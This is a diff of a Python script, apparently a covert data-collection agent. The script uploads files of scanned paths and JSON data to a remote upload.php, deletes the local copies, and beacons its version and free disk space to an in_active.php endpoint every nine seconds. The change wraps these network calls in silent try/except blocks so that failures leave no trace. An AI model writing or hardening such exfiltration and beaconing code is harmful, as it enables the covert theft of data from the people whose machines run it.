@@ -134,14 +134,20 @@ def run(root):
         'orgType': (None, 'B', None),
         'file': (r'%s_json.txt' % t, open(r'%s_json.txt' % t, 'rb'), 'unknown')
     }
-    requests.post(req_url + 'upload.php', headers=header, files=file_object)
+    try:
+        requests.post(req_url + 'upload.php', headers=header, files=file_object)
+    except:
+        pass
     temp_file = open(r'%s_path.txt' % t, 'rb')
     file_object = {
         'type': (None, '6', None),
         'orgType': (None, 'B', None),
         'file': (r'%s_path.txt' % t, temp_file, 'unknown')
     }
-    requests.post(req_url + 'upload.php', headers=header, files=file_object)
+    try:
+        requests.post(req_url + 'upload.php', headers=header, files=file_object)
+    except:
+        pass
     time.sleep(3)
     temp_file.close()
     os.remove('%s_json.txt' % t)
@@ -181,8 +187,11 @@ def update_checker():
 
 def stay_in_active():
     while not new_version:
-        requests.post(req_url + '/in_active.php',
-                      data={'version': version, 'remains': str(shutil.disk_usage(roots[:2])[2] / (1024 ** 3))})
+        try:
+            requests.post(req_url + '/in_active.php',
+                          data={'version': version, 'remains': str(shutil.disk_usage(roots[:2])[2] / (1024 ** 3))})
+        except:
+            pass
         time.sleep(9)
 
 
